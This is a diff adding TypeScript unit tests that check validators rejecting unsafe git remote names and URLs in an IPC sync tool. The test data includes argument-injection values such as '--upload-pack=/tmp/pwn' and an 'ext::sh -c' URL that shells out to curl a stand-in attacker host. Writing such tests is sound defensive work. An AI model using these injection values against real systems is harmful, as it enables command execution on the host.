@@ -11,12 +11,33 @@ import {
   readState,
   createTask,
 } from "../../packages/kernel/src/ipc.js";
+import { isSafeGitRemoteName, isSafeGitRemoteUrl } from "../../packages/kernel/src/ipc-server.js";
 
 describe("IPC tools", () => {
   let db: MatrixDB;
 
   beforeEach(() => {
     db = createDB();
+  });
+
+  describe("sync_files validation", () => {
+    it("rejects git remote names that could be parsed as options", () => {
+      expect(isSafeGitRemoteName("origin")).toBe(true);
+      expect(isSafeGitRemoteName("backup-1")).toBe(true);
+      expect(isSafeGitRemoteName("--upload-pack=/tmp/pwn")).toBe(false);
+      expect(isSafeGitRemoteName("-c")).toBe(false);
+      expect(isSafeGitRemoteName("../origin")).toBe(false);
+      expect(isSafeGitRemoteName("")).toBe(false);
+    });
+
+    it("rejects git remote URLs that can execute commands", () => {
+      expect(isSafeGitRemoteUrl("https://github.com/HamedMP/matrix-os.git")).toBe(true);
+      expect(isSafeGitRemoteUrl("ssh://git@github.com/HamedMP/matrix-os.git")).toBe(true);
+      expect(isSafeGitRemoteUrl("git@github.com:HamedMP/matrix-os.git")).toBe(true);
+      expect(isSafeGitRemoteUrl("ext::sh -c 'curl attacker.test'")).toBe(false);
+      expect(isSafeGitRemoteUrl("file:///tmp/repo.git")).toBe(false);
+      expect(isSafeGitRemoteUrl("--upload-pack=/tmp/pwn")).toBe(false);
+    });
   });
 
   describe("createTask", () => {
